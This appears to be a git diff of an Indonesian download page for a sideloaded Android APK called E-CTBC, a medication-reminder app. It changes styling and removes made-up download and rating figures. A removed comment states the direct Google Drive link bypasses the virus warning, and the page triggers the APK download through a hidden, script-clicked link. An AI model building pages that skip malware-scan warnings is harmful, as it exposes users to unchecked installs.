@@ -24,7 +24,7 @@
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
             line-height: 1.6;
             color: #333;
-            background: white;
+            background: #4285f4;
             min-height: 100vh;
             overflow-x: hidden;
         }
@@ -118,12 +118,16 @@
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 1.4rem;
-            font-weight: 900;
-            color: #4285f4;
             box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-            animation: logoFloat 4s ease-in-out infinite;
             border: 3px solid rgba(255,255,255,0.3);
+            overflow: hidden;
+        }
+
+        .logo img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 1.2rem;
         }
 
         @keyframes logoFloat {
@@ -357,7 +361,7 @@
         }
 
         .instruction-card {
-            background: #f8f9fa;
+            background: white;
             border-radius: 20px;
             padding: 1.8rem;
             margin-bottom: 1.2rem;
@@ -395,7 +399,7 @@
         .instruction-title {
             font-size: 1.2rem;
             font-weight: 700;
-            color: white;
+            color: #333;
             margin-bottom: 1rem;
             display: flex;
             align-items: center;
@@ -445,7 +449,7 @@
         }
 
         .step strong {
-            color: white;
+            color: #333;
             font-weight: 600;
         }
 
@@ -497,7 +501,7 @@
             color: #666;
             font-size: 0.9rem;
             border-top: 1px solid #eee;
-            background: #f8f9fa;
+            background: white;
         }
 
         .footer p:first-child {
@@ -533,7 +537,7 @@
         }
 
         .loading-text {
-            color: #666;
+            color: #333;
             font-weight: 600;
         }
 
@@ -633,40 +637,27 @@
         /* Dark Mode Support */
         @media (prefers-color-scheme: dark) {
             .container {
-                background: #1a1a1a;
-                color: white;
+                background: white;
+                color: #333;
             }
 
             .content {
-                background: #1a1a1a;
+                background: white;
             }
 
             .instruction-card {
-                background: #2d2d2d;
-                color: white;
-            }
-
-            .stat-card {
-                background: #2d2d2d;
-                color: white;
-            }
-
-            .version-info {
-                color: #bbb;
-            }
-
-            .instruction-steps {
-                color: #ccc;
+                background: white;
+                color: #333;
             }
 
             .footer {
-                background: #2d2d2d;
-                color: #bbb;
+                background: white;
+                color: #666;
             }
 
             .loading {
-                background: #2d2d2d;
-                color: white;
+                background: white;
+                color: #333;
             }
         }
     </style>
@@ -678,11 +669,11 @@
         <div class="header">
             <div class="logo-container">
                 <div class="logo">
-                    E-CTBC
+                    <img src="/logo.png" alt="E-CTBC Logo" onerror="this.style.display='none'; this.parentNode.innerHTML='E-CTBC'; this.parentNode.style.fontSize='1.4rem'; this.parentNode.style.fontWeight='900'; this.parentNode.style.color='#4285f4';">
                 </div>
             </div>
             <h1 class="app-name">E-CTBC</h1>
-            <p class="app-description">Aplikasi Digital Terpercaya untuk Kebutuhan Anda</p>
+            <p class="app-description">Aplikasi pengingat minum obat anda</p>
         </div>
 
         <div class="content">
@@ -694,22 +685,7 @@
                 <div class="version-info">
                     <span class="version-badge">v1.0.0</span>
                     <span class="version-badge">Android 5.0+</span>
-                    <span class="version-badge">15 MB</span>
-                </div>
-            </div>
-
-            <div class="stats-section">
-                <div class="stat-card">
-                    <div class="stat-number">5K+</div>
-                    <div class="stat-label">Downloads</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">4.9★</div>
-                    <div class="stat-label">Rating</div>
-                </div>
-                <div class="stat-card">
-                    <div class="stat-number">99%</div>
-                    <div class="stat-label">Satisfied</div>
+                    <span class="version-badge">56 MB</span>
                 </div>
             </div>
 
@@ -802,34 +778,53 @@
             // Show loading animation
             const loadingDiv = document.getElementById('loadingDiv');
             const successDiv = document.getElementById('successDiv');
-            loadingDiv.style.display = 'block';
             
-            // Link Google Drive yang bypass virus warning
-            const downloadUrl = 'https://github.com/iamfinnz/ectbc-download/releases/download/v1.0.0/ectbc.apk';
+            // Check if elements exist before using them
+            if (loadingDiv) {
+                loadingDiv.style.display = 'block';
+            }
+            
+            // Gunakan URL Google Drive yang aktual
+            const downloadUrl = 'https://drive.usercontent.google.com/download?id=10onnsx2CVXlMTU7TgTwXxxyr9yxDdpL8&export=download&authuser=0';
             
             // Simulasi loading dengan progress
             setTimeout(() => {
-                loadingDiv.style.display = 'none';
-                successDiv.style.display = 'block';
+                if (loadingDiv) {
+                    loadingDiv.style.display = 'none';
+                }
                 
-                // Create invisible download link and click it
+                if (successDiv) {
+                    successDiv.style.display = 'block';
+                }
+                
+                // Force download dengan creating download link
                 const link = document.createElement('a');
                 link.href = downloadUrl;
                 link.download = 'ectbc.apk';
                 link.target = '_blank';
+                link.rel = 'noopener noreferrer';
+                
+                // Append to body, click, then remove
                 document.body.appendChild(link);
                 link.click();
                 document.body.removeChild(link);
                 
                 // Update button appearance
-                this.innerHTML = '<span class="download-icon">✅</span> Download Dimulai!';
-                this.style.background = '#28a745';
+                if (this) {
+                    this.innerHTML = '<span class="download-icon">✅</span> Download Dimulai!';
+                    this.style.background = '#28a745';
+                }
                 
                 // Hide success message and reset button after 4 seconds
                 setTimeout(() => {
-                    successDiv.style.display = 'none';
-                    this.innerHTML = '<span class="download-icon">📱</span> Download E-CTBC';
-                    this.style.background = '#ea4335';
+                    if (successDiv) {
+                        successDiv.style.display = 'none';
+                    }
+                    
+                    if (this) {
+                        this.innerHTML = '<span class="download-icon">📱</span> Download E-CTBC';
+                        this.style.background = '#ea4335';
+                    }
                 }, 4000);
             }, 2000);
             
@@ -875,18 +870,24 @@
         window.addEventListener('load', function() {
             const cards = document.querySelectorAll('.instruction-card');
             cards.forEach((card, index) => {
-                setTimeout(() => {
-                    card.style.opacity = '1';
-                    card.style.transform = 'translateY(0)';
-                }, index * 200);
+                if (card) { // Check if card exists
+                    setTimeout(() => {
+                        card.style.opacity = '1';
+                        card.style.transform = 'translateY(0)';
+                    }, index * 200);
+                }
             });
         });
 
         // Initialize card animations
-        document.querySelectorAll('.instruction-card').forEach(card => {
-            card.style.opacity = '0';
-            card.style.transform = 'translateY(20px)';
-            card.style.transition = 'all 0.6s ease';
+        document.addEventListener('DOMContentLoaded', function() {
+            document.querySelectorAll('.instruction-card').forEach(card => {
+                if (card) { // Check if card exists
+                    card.style.opacity = '0';
+                    card.style.transform = 'translateY(20px)';
+                    card.style.transition = 'all 0.6s ease';
+                }
+            });
         });
     </script>
 </body>
